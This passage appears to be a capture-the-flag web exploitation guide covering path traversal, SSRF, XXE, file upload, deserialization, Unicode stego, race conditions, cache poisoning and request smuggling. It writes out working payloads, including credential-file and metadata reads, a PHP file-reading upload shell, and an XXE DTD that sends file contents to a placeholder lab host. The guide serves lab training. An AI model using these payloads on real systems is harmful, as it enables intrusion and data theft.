A 200 OK page containing a fixed error is a negative result. Match real file contents and compare a nonexistent path.
2. Bypass according to observed path handling ../etc/passwd ../../../../etc/passwd ....//....//....//etc/passwd ..%2f..%2f..%2fetc/passwd %2e%2e%2f%2e%2e%2fetc/passwd %252e%252e%252f%252e%252e%252fetc/passwd ..\..\..\Windows\win.ini Variant Required mistake ....// A single nonrecursive removal of ../ leaves ../ behind %2e / %2f Decoding occurs after the relevant validation %252e / %252f Two decoding stages occur in the path to the sink Backslashes Downstream OS/library treats \ as a separator Absolute path Join operation permits replacing the intended base path Do not infer double decoding merely because a payload contains %25. Observe a decoding difference or inspect source. URI routing and filesystem normalization happen at different layers.
3. Once arbitrary read works Use the process and source clues to locate the challenge:
/etc/passwd /proc/self/cmdline /proc/self/environ /proc/self/cwd/app.py /proc/self/cwd/package.json /proc/self/cwd/.env /var/www/html/index.php /flag.txtThese are candidates, not guaranteed locations. /proc/self refers to the process performing the read. Environment data may contain NUL separators, lack expected variables, or be access-restricted. An empty environment response is not proof no secret exists.
Read routing code → imports/config → actual file/DB locations. A read primitive does not list directories unless the vulnerable endpoint supports directory listing.
4. PHP source disclosure with filters If the sink accepts PHP stream wrappers:
php://filter/read=convert.base64-encode/resource=index.php php://filter/convert.base64-encode/resource=/var/www/html/config.php php://filter/read=convert.base64-encode/resource=/flag.txtDecode the returned Base64 using your permitted local decoder. Wrapping PHP source prevents include from executing it and returns encoded source instead. resource= belongs at the end; paths are resolved under the process’s permissions and working directory. PHP documents the wrapper and its filter order.
If the application appends .php, your resource becomes index.php.php unless the payload accounts for the suffix. First read the source and find exactly where concatenation happens.
5. Include-only execution paths These need an actual include/evaluation sink. file_get_contents() alone returns bytes.
Candidate Preconditions Include an uploaded PHP-bearing file Know its local path; contents remain intact Include an application log Control a logged field; know log path; log readable Include a session file PHP session storage is file-based; session data is controllable and path known data://text/plain,... Wrapper accepted and required URL include settings enabled php://input Body reaches the sink and wrapper/include configuration allows it Archive wrapper Relevant extension exists and exact archive/member path is known For a lab file you control, use a fixed marker rather than a general command endpoint:
<?php echo "CTF_INCLUDE_71"; ?> The marker must execute, not merely appear as source. For inclusion chains, the uploaded extension may be irrelevant: include interprets PHP tags inside the selected file.
Remote URL inclusion depends on PHP configuration and wrapper support; successful local traversal does not establish RFI. See PHP include behavior.
6. Things that often waste time Symptom Check /etc/passwd works, source does not Wrong path, suffix concatenation or permissions Traversal returns an image error App may decode/rescale the file after reading Source appears blank PHP may have executed; try Base64 filter disclosure Base64 output is wrapped in HTML Decode only the actual encoded data Old %00 payload fails Modern PHP path APIs reject NUL; old truncation recipes are not a default phar:// reads a member but no effect Archive access does not guarantee metadata deserialization; PHP/version and API matter Related: uploads, XXE, encoding.
References: path traversal, PHP conversion filters.

title: SSRF
content:
Server-side request forgery Establish that the server fetches a URL, then identify the URL parser, protocol and network location. Typical sinks: previews, webhook testers, imports, stock checks, image/PDF renderers.
1. First probe and control Give the endpoint a unique path on a challenge-provided callback service:
http://YOUR-LAB-HOST/ssrf-marker-71Then compare an ordinary valid fetch and an intentionally missing path. Inspect request method, headers, source and callback timing. A browser loading your image is not a server fetch; submit the same request in Repeater without rendering the page.
No callback facility? Compare an already known local service with a closed port. A timeout or connection error is a clue, not a reliable service identification on its own.
2. Local address ladder http://127.0.0.1/ http://localhost/ http://[::1]/ http://127.0.0.1:5000/ http://127.0.0.1:8000/ http://127.0.0.1:8080/Choose ports from source, Docker Compose, errors or supplied challenge services. A localhost fetch happens inside the fetcher’s container/network namespace; it may not reach the host machine or another container.
Result Meaning / next step Internal page body appears Response-reading SSRF; enumerate that service’s actual routes Immediate connection refused Address reached but service may not listen at that port Timeout Could be filtering, unroutable address or a slow service Callback logged but no body shown Blind SSRF; look for later report storage or challenge-supported out-of-band proof Your browser contacts the host Client-side fetch; investigate browser restrictions separately 3. Filter bypass: identify the failing layer Payload candidate What it tests http://127.1/ Client accepts abbreviated IPv4 http://2130706433/ Client accepts integer IPv4 http://0x7f000001/ Client accepts hexadecimal IPv4 http://[::ffff:127.0.0.1]/ IPv4-mapped IPv6 handling differs http://allowed.invalid@127.0.0.1/ Naive prefix/userinfo validation; actual host is loopback http://127.0.0.1/#allowed.invalid Naive substring validation; fragment is not sent as HTTP path http://allowed.invalid.YOUR-LAB-HOST/ Substring check instead of a correct hostname boundary These forms are parser-dependent. Modern clients may reject or normalize them before any connection. A hostname ending in attacker-controlled text is not the allowlisted domain.
Observe which host the HTTP client actually uses. A parser disagreement requires two parsers with different results, not a cleverly formatted URL by itself.
4. Redirect checks If a permitted lab host can return redirects, compare:
HTTP/1.1 302 Found Location: http://127.0.0.1:5000/ Content-Length: 0Does the server follow redirects? Does it revalidate each destination and resolved IP? Some clients change POST to GET on a 302; 307/308 preserve method under standard behavior. The target’s client configuration decides what is followed.
5. Duplicate parameters and request construction When a frontend validates one value but forwards a raw query downstream:
url=http://allowed.invalid/&url=http://127.0.0.1:5000/ url=http://127.0.0.1:5000/&url=http://allowed.invalid/These show raw query fragments: encode each inner URL as required. Compare both orders and single-value controls. Some parsers select first, last, an array, or reject duplicates. Never assume a language fixes this behavior for every framework/configuration.
6. Protocol and method limitations Candidate Requirement / implication file:///etc/passwd Fetch library permits local-file scheme; this becomes a file-read path gopher://... Client supports Gopher and accepts crafted bytes; not a universal HTTP feature HTTP internal admin GET Endpoint is reachable and GET performs useful read/action Internal POST Need method/body control, redirect behavior or a genuine protocol pivot Header-based internal auth Need control of those headers; URL control alone is insufficient Do not paste a Redis or database payload into an HTTP-only fetcher and expect raw TCP. Identify the actual library’s allowed protocols first.
7. Cloud-shaped labs http://169.254.169.254/ is a link-local metadata candidate in cloud-style challenges. Providers differ in paths, required headers, request methods and session tokens. A fetcher with only GET and no custom headers may be unable to complete a token-based flow. Inspect the challenge’s provider clues rather than using one provider’s paths everywhere.
8. Finish the chain Internal service discovered → read its landing page/source/API documentation → reproduce its required method and parameters → satisfy auth/state prerequisites → retrieve the challenge result. An internal 200 proves reachability, not administrative access.
DNS rebinding is a later step: it requires resolution/connection timing that actually differs, a domain under your control and a permitted network path. First exhaust literal IP, redirect and parser-difference evidence.
Related: XXE, HTTP parsing, encoding.
References: PortSwigger SSRF, curl URL syntax.

title: XXE & XML Parsers
content:
XML external entity injection Prove XML processing, then entity expansion, then external resource access. Each step establishes a different capability.
1. Establish the parsing surface Look for XML API bodies, SOAP, SVG, document imports and server-side XML conversions. Keep the application’s real root and field names; changing the entire document may fail schema validation before reaching the interesting parser.
<?xml version="1.0"?> <stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>Use the original accepted Content-Type, normally application/xml or text/xml. A JSON route may reject XML completely. Conversion support must be demonstrated, not assumed.
2. Internal entity probe <?xml version="1.0"?> <!DOCTYPE stockCheck [ <!ENTITY marker "CTF_XML_71"> ]> <stockCheck><productId>▮</productId><storeId>1</storeId></stockCheck>Control: change the entity value to CTF_XML_82. Expanded markers in a field-validation error establish internal entity processing. An unchanged ▮, escaped output or a generic error does not.
Internal entities working does not prove external entities are enabled.
3. Local file entity <?xml version="1.0"?> <!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>Compare file:///etc/ctf-does-not-exist. Recognizable file bytes vs a read failure are evidence. Then read known application source or the actual challenge path using the same primitive.
Potential complications: numeric conversion before reflection, newlines in the response, illegal XML characters inside the target file, restricted file permissions, or a parser configured to load no external resources.
For a confirmed PHP stream-capable XML loader, a Base64 filter can encode difficult file bytes:
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/config.php">This is PHP-specific; Java and Python XML parsers do not implement PHP wrappers.
4. Blind external entity callback <?xml version="1.0"?> <!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://YOUR-LAB-HOST/xxe-general-71"> ]> <stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>If general entity processing is blocked but external parameter entities are allowed, test a unique marker:
<?xml version="1.0"?> <!DOCTYPE stockCheck [ <!ENTITY % remote SYSTEM "http://YOUR-LAB-HOST/xxe-parameter-71"> %remote; ]> <stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>Serve valid DTD content, such as an empty response, if the callback is fetched. Compare a normal XML control and fresh callback IDs. A callback establishes resource resolution; it does not automatically disclose file contents. See blind XXE prerequisites.
5. External DTD file extraction in a matching lab If the challenge permits serving your own DTD, the submitted document can load it:
<?xml version="1.0"?> <!DOCTYPE stockCheck [ <!ENTITY % remote SYSTEM "http://YOUR-LAB-HOST/extract.dtd"> %remote; ]> <stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>Contents of extract.dtd:
<!ENTITY % file SYSTEM "file:///flag.txt"> <!ENTITY % eval "<!ENTITY % send SYSTEM 'http://YOUR-LAB-HOST/collect?data=%file;'>"> %eval; %send;This depends on external DTD/parameter entity expansion and outbound HTTP. Raw file bytes must fit a URI: spaces, newlines, &, # and binary data commonly break this approach. It is not an arbitrary-file universal extractor. Base64 needs a supported encoding primitive; XML entity expansion does not URL-encode data for you.
6. XInclude: cannot control a DOCTYPE An application may place your XML fragment inside a larger document and run XInclude processing:
<probe xmlns:xi="http://www.w3.org/2001/XInclude"> <xi:include parse="text" href="file:///etc/passwd"/> </probe>Use the exact field accepting an XML fragment. Merely parsing XML does not necessarily invoke XInclude; this is a separate processor feature. A missing-file control helps distinguish processing from plain reflection.
7. SVG and document uploads SVG is XML, but the server must parse it for a server-side XXE. A browser rendering an SVG is a different surface. Office-style containers may hold XML documents; editing XML inside an archive helps only if the server processes that XML with vulnerable options.
Troubleshooting Result Next action DOCTYPE is disallowed This parser blocks the direct route; inspect another processing stage Internal marker expands, external file does not External entity setting, protocol restriction or permissions Numeric validation error Read error body; it may contain expanded text Callback never occurs Check reachability with the provided facility and whether external resolution is enabled Empty response Look for generated report, asynchronous import status or saved parser error Related: SSRF, upload processing.
Reference: PortSwigger XXE overview and parser surfaces.

title: File Upload
content:
File upload Track four stages separately: accepted → stored → reachable → interpreted. An upload success message proves only the first stage.
1. Establish the normal path Upload an allowed small file with a unique marker. Save the multipart request, response URL, final stored filename and retrieval response headers. Compare the retrieved bytes with the original: resizing/re-encoding can remove appended content and metadata.
POST /upload HTTP/1.1 Host: ctf.invalid Content-Type: multipart/form-data; boundary=ctf71 --ctf71 Content-Disposition: form-data; name="file"; filename="marker.txt" Content-Type: text/plain CTF_UPLOAD_71 --ctf71--Keep other required fields, cookies and CSRF tokens from the captured request. Let Repeater update Content-Length. Multipart delimiters use the exact declared boundary with two leading dashes; the last delimiter has two trailing dashes.
2. Isolate the check Change one dimension per request:
Dimension Test Interpretation Filename extension Valid image bytes as marker.txt vs marker.png Name-based restriction Part MIME Same bytes/name, image/png vs text/plain Trust in attacker-controlled part header File signature Real image vs plain marker with identical name/MIME Magic-byte or decoder validation Actual decoder Valid image vs truncated signature-only file Full decoding rather than prefix inspection Stored location Original name vs random server name Need response/source to locate the file Response handling Direct URL vs download endpoint Web server interpretation may differ The multipart part MIME is separate from the outer multipart/form-data content type.
3. Extension candidates marker.php marker.phtml marker.php5 marker.PHP marker.php.jpg marker.jpg.php marker.php.These are hypotheses about extension checks and server handlers. .php5 and .phtml execute only if configured. A double extension does not inherently execute. Trailing-dot normalization varies by OS/server. %00 truncation is an old behavior, not a modern default.
Confirm actual behavior with a fixed executable marker in a matching PHP lab:
<?php echo "CTF_EXEC_71"; ?> If the browser shows PHP source or downloads it, execution failed. If only the generated marker appears, compare a different marker to rule out an existing static response. Then use a fixed file read where the challenge’s file path is known:
<?php echo file_get_contents('/flag.txt'); ?> File permissions and runtime restrictions remain in force. Source disclosure, execution and static hosting have different outcomes. PortSwigger describes this handler dependency.
4. Content and image processing A prefix-only checker may accept a crude GIF-prefixed PHP payload:
GIF89a <?php echo "CTF_EXEC_71"; ?>This is not a valid fully decoded image. If the server decodes/resizes images, start with a genuine allowed image and determine which metadata or byte regions survive. A polyglot must satisfy the actual decoder and later execution parser.
An image stored as .jpg does not execute PHP merely because it contains PHP tags. You also need an execution handler or a second inclusion sink. See LFI chains.
5. Filename path handling ../marker.txt ..\marker.txt ../../uploads/marker.txtCompare returned name and retrieval path. Some libraries discard directory components; others preserve them. Encoding is useful only if a later layer decodes it. Do not assume the name displayed in the UI is the filesystem name.
Prove a benign marker write outside the intended upload directory before reasoning about config overwrite. Arbitrary overwrite also requires writable paths and a filename the application actually preserves.
6. Other useful upload chains Surface Follow-up SVG preview Test stored browser context/XSS or server-side XXE according to processing HTML attachment Is it served inline under the application origin or forced as download? ZIP import Inspect member path traversal and extraction root; reading a ZIP is not extraction Avatar/document IDs Test ownership when reading, replacing and deleting files External image import Follow SSRF flow Conversion command Follow command injection flow Uploaded template Does the application actually render it? Then inspect SSTI Serving an SVG under an isolated storage origin or as an image does not automatically produce application-origin script execution.
7. Execution fails: decision table Observation Likely next question Accepted, retrieval 404 Private storage, renamed file, processing queue or wrong URL? Accepted, bytes changed Image/document sanitization or conversion? Accepted, source/download returned Static handler or download controller? 403 only for executable names Directory execution rule or edge extension block? Upload works briefly Temporary storage before validation or asynchronous cleanup? Same name replaces old file Is name collision intentional, and does ownership get checked? Inspect the actual retrieval response rather than the upload success toast. Use returned IDs and application routes before guessing paths.
References: PHP upload handling, PortSwigger upload vulnerability workflow.

title: Deserialization
content:
Insecure deserialization Identify the format and actual decoder before changing bytes. Base64 is an encoding, not a serializer; an unsigned JSON cookie may be plain data tampering rather than object injection.
1. Find and unwrap the input Look at cookies, saved preferences, cart/import blobs, queue messages and backup uploads. Save the original bytes before editing.
Transport decoding → Base64/hex if present → compression if present → serializationDecode only layers supported by evidence. Re-encode in reverse order after a single small change. A signature/MAC must still validate; knowing its encoding does not let you forge it.
Prefix / clue Candidate format Next check a:, O:, s:, i: PHP serialization Locate unserialize and available classes Binary 80 04 / 80 05, Base64 often gAS Python pickle protocol Confirm pickle.loads or equivalent in source Binary ac ed 00 05, Base64 often rO0AB Java object serialization Confirm ObjectInputStream, classpath and filtering YAML tags such as !!... YAML constructor Identify library, loader class and version JSON @type / $type Type-enabled framework serializer Identify exact library and configuration Prefixes are clues; arbitrary data may share them. JSON parsing itself does not execute arbitrary constructors.
2. PHP: controlled data modification a:2:{s:4:"user";s:5:"guest";s:5:"admin";b:0;} a:2:{s:4:"user";s:5:"guest";s:5:"admin";b:1;}If the application directly trusts this unsigned field, compare authorization behavior. A successful parse and displayed admin=true are weaker evidence than access to an actual protected endpoint.
Syntax card N; null b:1; boolean true i:7; integer d:7.5; double s:5:"guest"; five-byte string a:1:{s:4:"role";s:4:"user";} array with one key/value pair O:4:"User":1:{s:4:"role";s:5:"admin";} object with one propertyString/class lengths count bytes, not displayed Unicode characters. Array counts are key/value pairs. Object counts are properties. Wrong lengths often cause an offset error before application code runs.
3. PHP: source-guided object injection Find entry points and magic methods:
unserialize(...) __unserialize __wakeup __destruct __toString __get / __set / __callTrace input properties → magic method → file/command/template sink. A class name in a payload works only if that class is defined/autoloadable and permitted by the application’s deserialization options.
For example, only if source defines a class Reader with public path and a destructor that reads it, a matching object is:
O:6:"Reader":1:{s:4:"path";s:9:"/flag.txt";}Without that exact behavior, this object does nothing useful. PHP documents unserialize options and object reconstruction.
Private/protected property names contain NUL bytes and class prefixes. Do not type the literal characters \0 and expect a NUL; use a byte-capable permitted editor. PHP typed properties, __unserialize and version differences can also invalidate an old property chain.
4. Python pickle: format and a manual proof The following protocol-0 pickle resolves builtins.str, calls it with 71, and returns the resulting string. The displayed line breaks are part of the pickle:
cbuiltins str (I71 tR.This is a constructor-call proof only if the sink unpickles your bytes and the returned value is observable. It may fail if the app expects a dictionary or uses a restricted unpickler. On Python 3, builtins is the module; Python 2 used different naming.
Do not assume a pickle byte prefix establishes execution. First confirm the actual load function and whether a signature blocks tampering. Python’s pickle documentation explains the code-execution risk.
5. Java and YAML: prerequisites before payloads Stack Required facts Java native serialization Classes/dependencies, versions, permitted types, reachable gadget entry point YAML Unsafe object-construction loader, accepted tag syntax and installed modules JSON type metadata Polymorphic typing enabled, allowed types and dangerous gadget behavior Signed framework session Signature key or verification flaw before modified data will be loaded A universal Java/YAML object payload is misleading: the same bytes can execute on one dependency set and merely error on another. Read supplied dependency manifests, lockfiles and source. If prebuilt gadget utilities are permitted by your event, match their chain to the exact installed classes; this page does not require a generated solver.
6. Troubleshooting Result Check next MAC/signature failure Tampering is detected before decoding; investigate key/verification evidence Offset/EOF error Byte lengths, missing terminator, URL/Base64 encoding Unknown class / incomplete class Class loading, class allowlist, dependency mismatch Object parses but no effect Missing trigger, wrong property visibility or unreachable sink Effect happens after response Destructor, queued processing or subsequent session use Related: auth and object trust, encoding, uploads.
Reference: PortSwigger insecure deserialization.

title: Text, Whitespace & Unicode
content:
Text, whitespace and Unicode channels Inspect code points and raw bytes before normalizing or copying text. The displayed sentence may hide a different logical character sequence.
1. First inspection xxd -l 256 message.txt python3 text_unicode.py message.txt --limit 200Download text_unicode.py. It uses only the standard library. Suspicious characters are printed using escaped representations and Unicode names, so BiDi controls cannot silently reorder the terminal report.
index=12 U+200B escaped='\u200b' category=Cf bidi='BN' name=ZERO WIDTH SPACE total=64The index counts decoded code points, not raw byte offsets or visual columns. The script does not strip, normalize or repair text. Invalid UTF-8 is a diagnostic failure: identify the actual encoding instead of dropping bytes with errors="ignore".
2. Useful code-point clues Code point Name / possible role U+0009 Tab: whitespace symbol distinct from space U+0020 Ordinary space U+00A0 Nonbreaking space U+200B Zero-width space U+200C / U+200D Zero-width non-joiner / joiner U+2060 Word joiner U+FEFF BOM at the start of some text; elsewhere a format character U+202A–U+202E BiDi embedding/override controls and termination U+2066–U+2069 BiDi isolation controls U+FE00–U+FE0F Variation selectors These have legitimate uses in language and typography. Two frequent invisible symbols are a binary-channel hypothesis, not proof of hidden data. Unicode’s BiDi algorithm explains logical versus display order.
3. Two-symbol binary extraction If evidence indicates U+200B means zero and U+200C means one:
python3 text_unicode.py message.txt --zero U+200B --one U+200C --output hidden.bin xxd -l 128 hidden.bin strings -a hidden.binThe extractor ignores all other characters, preserving the order of selected symbols. By default the first selected bit becomes the output byte’s most significant bit. It discards an incomplete final byte and reports the count.
Controls and alternatives:
python3 text_unicode.py message.txt --zero U+200C --one U+200B --output inverted.bin python3 text_unicode.py message.txt --zero U+200B --one U+200C --pack lsb --output little-bits.bin python3 text_unicode.py message.txt --zero U+200B --one U+200C --skip-bits 3 --output shifted.binTry a change because it fits an encoding hypothesis; do not treat a random short printable substring as proof. Validate a complete phrase, expected prefix, file header or checksum.
4. Tabs, spaces and trailing whitespace from pathlib import Path raw = Path("message.txt").read_bytes() for number, line in enumerate(raw.splitlines(keepends=True), 1): # repr shows tabs and line endings without rendering them as layout. print(number, repr(line))If only tabs/spaces at line ends appear meaningful, isolate precisely that region rather than every space in the cover sentence:
from pathlib import Path lines = Path("message.txt").read_bytes().splitlines() trailers = [line[len(line.rstrip(b" \t")):] for line in lines] for index, trailer in enumerate(trailers, 1): print(index, repr(trailer), "bits", "".join("0" if b == 32 else "1" for b in trailer))Determine whether each line is a separate byte/codeword, whether newlines are delimiters and whether there is a header/length. Plain copying through an editor or Markdown can remove trailing whitespace and invalidate the channel.
5. Capitalization, acrostics and layout Clue Targeted extraction Weird capitals Preserve letter order; try a binary upper/lower hypothesis Forced line breaks First/last character of each original line Odd word choices Word lengths, initial letters, clue-specific indices Similar-looking letters Compare Unicode code points before transliteration Strange line lengths Record byte count and code-point count separately For a line-initial hypothesis:
from pathlib import Path lines = Path("message.txt").read_text(encoding="utf-8").splitlines() print("".join(line[0] for line in lines if line))This takes the actual first code point, including a leading space if present. Do not call .strip() unless the hypothesis requires removing that evidence.
6. Normalization comparison from pathlib import Path import unicodedata text = Path("message.txt").read_text(encoding="utf-8") for form in ("NFC", "NFD", "NFKC", "NFKD"): normalized = unicodedata.normalize(form, text) print(form, "changed", normalized != text, "length", len(normalized))Do this for comparison; preserve the original. Compatibility normalization can merge distinct characters and erase a deliberate distinction. It does not universally remove invisible characters or turn every confusable into ASCII. See Unicode normalization.
Troubleshooting Problem Next check Symbols visible in report but no full bytes Wrong mapping or too few symbols One byte correct then nonsense Character order, per-line framing or a third delimiter symbol Text looks reversed Logical code-point order versus display BiDi Text changed after paste Editor normalization, stripped whitespace or changed line endings Lots of non-ASCII language text Legitimate script, combining marks and joiners before stego assumptions Tools: Notepad++, HxD, CyberChef, Python.

title: Business Logic & Races
content:
Business logic and race conditions Write the invariant first: “one account may redeem this code once,” “the charged amount equals the server’s product price,” or “a completed order cannot change owner.” Then build the smallest request sequence that violates it.
1. Map the intended workflow Register → verify identity → add item → apply coupon → pay → confirm → downloadCapture every request and object ID. Note which endpoint changes state, which values come from the client and which checks depend on previous steps. A disabled button is not a server check.
Use two challenge accounts where available. Check final balance, stored order and protected resource access instead of trusting a success toast.
2. Numeric and type boundaries Assume the normal cart request is:
{"product_id":7,"quantity":1}Change only one field:
{"product_id":7,"quantity":0} {"product_id":7,"quantity":-1} {"product_id":7,"quantity":0.5} {"product_id":7,"quantity":"1"} {"product_id":7,"quantity":null} {"product_id":7,"quantity":[]} Observation Next check Negative item decreases total Can checkout or refund increase balance? Fractional quantity accepted Are payment and fulfillment rounding consistent? String accepted as number Does another endpoint parse it differently? Missing/null field uses a default Is the default safer or more privileged? Large value wraps or changes sign Identify integer width and subsequent pricing calculation Try boundary values guided by the language/storage type, such as 2147483647 and 2147483648, rather than assuming every stack uses 32-bit signed integers. JSON does not standardly allow NaN or Infinity; parser acceptance is implementation-dependent.
3. Trust in client-supplied prices and state {"product_id":7,"quantity":1,"price":1} {"product_id":7,"quantity":1,"discount":100} {"product_id":7,"quantity":1,"paid":true}These keys only matter if the server actually reads or mass-assigns them. Inspect HTML/JS and normal request bodies first. If the price merely echoes in a response, compare the stored order and final payment amount.
Watch for mismatches between currency units (1 dollar vs 1 cent), rounding per item vs per order, and discounts applied before vs after a minimum-value check.
4. State-machine tests Test Example sequence Skip a step Call confirmation/download before payment Replay a step Redeem the same code twice sequentially Reorder steps Add expensive item after minimum-price/payment validation Change identity midway Start flow as A, complete with B’s session Change object midway Pay order A, submit confirmation using order B Reuse a token Reuse reset/invitation/claim token after successful completion Cancel then finish Cancel/refund and later replay fulfillment Keep a normal sequence as the control. A 302 to the next step is not proof of a completed state transition. Refresh server-side state after every test.
5. Duplicate values / normalization quantity=1&quantity=-1 coupon=FIRST&coupon=SECOND email=user@example.invalid email=USER@example.invalidDuplicate field handling differs by parser. Case normalization differs by application and identity policy. Demonstrate that two components disagree before using it as a bypass. Do not assume duplicate JSON keys are interpreted consistently.
6. Race conditions: first rule out ordinary replay Get a clean account/item/token state. Send the action twice sequentially. Record the final state. Reset/recreate equivalent state. Send the same two prepared requests in parallel, using Repeater’s parallel group send if your installed version supports it. Compare stored effects with the sequential control. POST /coupon/redeem HTTP/1.1 Host: ctf.invalid Cookie: session=YOUR_SESSION Content-Type: application/x-www-form-urlencoded code=ONCEIf sequential replay already redeems twice, ordinary missing replay protection explains it; concurrency is not required. A genuine race signal is an extra persisted effect appearing only when checks and writes overlap.
7. Race prerequisites and failure modes Constraint Consequence One-time CSRF token Identical replay may fail before the vulnerable operation Session lock Same-session requests may serialize; use the application’s permitted parallel identities if relevant Database transaction/unique constraint Application timing window may still be protected at persistence Client opens separate connections Connection timing can dominate the overlap Job queue Effects may happen asynchronously; monitor until final state Stock/code consumed by first attempt New attempts require a fresh fixture/reset Begin with two requests. More volume does not establish correctness. For transfer races, check both source and destination balances plus the transaction ledger; two success responses can still correspond to one committed operation. PortSwigger’s race-condition model explains hidden intermediate states and synchronized testing.
8. Minimal evidence record Invariant: Starting balance / state: Normal sequence: Modified sequence: Sequential result: Parallel result (if applicable): Stored final state: Protected resource / challenge result:Related: auth / IDOR, Burp manual workflow.
Reference: business logic vulnerabilities.

title: HTTP, Cache & Smuggling
content:
HTTP parsing, cache issues and request smuggling Map the components: browser → CDN/cache → reverse proxy → application. Ask what each considers the host, path, cache key and end of the request.
1. Establish a baseline Capture the exact HTTP version, route and response headers. Repeat the request to see whether a cache is present.
GET /?probe=cache71 HTTP/1.1 Host: ctf.invalidInspect Age, Via, X-Cache, cache-status headers, Cache-Control and Vary. A missing cache header does not establish absence of caching; a header saying HIT is still weaker evidence than a controlled stored response difference.
Use a unique challenge-only path/query as a cache buster, then verify that it changes the cache key. If the cache ignores that parameter, it will not isolate your tests.
2. Cache poisoning: unkeyed input changes a stored response Potential inputs include forwarded-host headers, rewrite headers and query parameters omitted from the cache key. Test one at a time:
GET /?probe=poison71 HTTP/1.1 Host: ctf.invalid X-Forwarded-Host: marker71.invalidLook for a changed absolute link, redirect or resource URL. Then send the same keyed URL without the added header:
GET /?probe=poison71 HTTP/1.1 Host: ctf.invalidIf the second response retains the injected marker because a shared cache stored it, you have a poisoning signal. Confirm a fresh key produces a clean response. Reflection in the first response alone is insufficient. Follow the exact cached resource used by the challenge victim; arbitrary response changes may have no useful impact.
Additional candidates, only when the stack uses them:
X-Forwarded-Proto: http X-Original-URL: /marker71 X-Rewrite-URL: /marker71Header trust is configuration-dependent. These names have no universal semantics in HTTP.
3. Cache deception: private response classified as public/static Try a known private route with a path suffix:
/my-account/marker71.css /my-account;marker71.cssWorkflow:
As challenge user A, request the candidate once. Does it still return A’s account content? Request the identical URL without A’s cookie or as user B. Compare with a fresh unvisited candidate path and the normal protected route. Confirm any leaked content belongs to A and was served by the cache. This requires both origin routing that returns the private page and cache rules that store it. Static-looking extensions alone prove neither. Different delimiters and normalization behavior depend on the actual proxy/origin pair. See web cache deception.
4. CRLF response-header injection Candidate sinks: redirect next, filename in Content-Disposition, reflected cookie/header values.
/home%0d%0aX-CTF-Probe:%20marker71Enter this as an encoded value only where a decoded parameter reaches a response header. Inspect the raw response headers: a new X-CTF-Probe header is evidence; the same text in Location or an HTML body is not.
Modern frameworks commonly reject CR/LF in header values. A 400 or exception is not a successful split. For request-header tests, %0d%0a often stays literal: HTTP headers are not automatically URL-decoded like form values.
5. Request smuggling: learn framing before payloads HTTP/1.1 uses byte counts and chunk framing; parser disagreement may cause leftover bytes to become another request. RFC 9112 defines framing and handling of conflicting lengths.
Name Frontend uses Backend uses CL.TE Content-Length Transfer-Encoding TE.CL Transfer-Encoding Content-Length TE.TE Recognizes a TE variant Ignores/parses that variant differently H2.CL / H2.TE HTTP/2 framing Unsafe HTTP/1 downgrade framing These names describe an observed parser pair, not guaranteed behavior. A server accepting one request with both headers is not sufficient proof.
Exact framing controls A valid nonambiguous five-byte body:
POST / HTTP/1.1 Host: ctf.invalid Content-Type: text/plain Content-Length: 5 helloThe body is exactly hello, with no extra trailing newline. The displayed code fence may visually add one: verify the raw bytes in Repeater.
A separate valid chunked control uses the body bytes 5\r\nhello\r\n0\r\n\r\n:
POST / HTTP/1.1 Host: ctf.invalid Content-Type: text/plain Transfer-Encoding: chunked 5 hello 0Every displayed line ending must be CRLF on the wire; the final zero chunk ends with an empty line. Chunk size 5 is hexadecimal and counts only the five data bytes.
Detection workflow in a dedicated challenge instance Confirm ordinary Content-Length and chunked controls separately. Confirm whether Repeater is sending HTTP/1.1 or HTTP/2; editor text is not necessarily wire framing. For the suspected parser pair, design a one-byte/short-prefix discrepancy and calculate both parsers’ consumed bytes. Disable automatic Content-Length correction only when intentionally testing a mismatch. Compare timeout behavior with a fully consumed control; use a fresh connection to rule out leftovers. Confirm a controlled follow-up request gets a response altered by your chosen prefix, on the same relevant reused backend connection. Timeouts alone are inconclusive: network delay, incomplete body buffering and generic rejection can look similar. HTTP/2-to-HTTP/1 conversion can rewrite or reject your test. Do not mix a copied CL.TE body with TE.CL length assumptions. PortSwigger detection guidance gives parser-specific examples; compute lengths for the request you actually send.
6. Troubleshooting Symptom Check Poison only visible to your cookie Private/session-keyed cache rather than shared poisoning Cache buster has no effect Parameter omitted from key; find an actually keyed component One arbitrary request returns 400 Syntax rejection alone is not desynchronization Framing silently changes HTTP version, proxy normalization, Repeater length correction Correct prefix, no follow-up effect Connection reuse, frontend routing or backend isolation Related: encoding/parser differences, Burp notes.
References: web cache poisoning, request smuggling model.

title: PHP · Types / Hashes / Parsers
content:
PHP Quirks Read the comparison, PHP version, and input parser before choosing a trick. Many classic PHP CTF payloads changed behavior in PHP 8.
1. Loose comparison and magic hashes Vulnerable source pattern:
if (md5($input) == $stored_hash) { /* challenge gate */ }Two known MD5 inputs:
240610708 → 0e462097431906509019562988736854 QNKCDZO → 0e830400451993494058024219903391Both digests look like numeric scientific notation for zero. Comparing those digest strings using == can treat them as equal even on modern PHP. === compares string identity and prevents this particular bypass.
The exact precondition is a loose comparison between compatible numeric-looking hashes. A random target hash will not become zero just because your hash starts with 0e. Not every historical 0 == "nonnumeric" example works on PHP 8; string/number comparison rules changed.
Manual test order Find the exact hash algorithm and operator in source / hint. Check whether the stored digest itself has the numeric-string shape. Submit the matching known preimage for that algorithm. Compare with a normal wrong input and confirm the gated response/session. Do not use MD5 preimages for a SHA-1 gate. A hash collision, magic-hash numeric comparison, and password-hash verification are different attacks.
2. Arrays instead of strings URL-encoded form bodies can produce PHP arrays:
password[]=x username[role]=adminIf source calls strcmp, md5, or another string function on that value, older PHP versions could emit warnings and return values that interacted badly with loose checks. Current PHP often raises TypeError. An array-induced exception alone is not an authentication bypass.
First compare:
password=x password[]=xInspect the error and version, then trace what the application does with the return value. Do not assume strcmp(array,...) == 0 works everywhere.
3. Request parsing and duplicate keys role=user&role=admin user.name=alice user_name=alice user[name]=alicePHP’s ordinary query parsing can normalize dots/spaces in parameter names to underscores and can interpret bracket syntax as arrays. Duplicate ordinary names commonly select the last value. A proxy, framework, JSON parser, or upstream validator may see something different.
Record all stages:
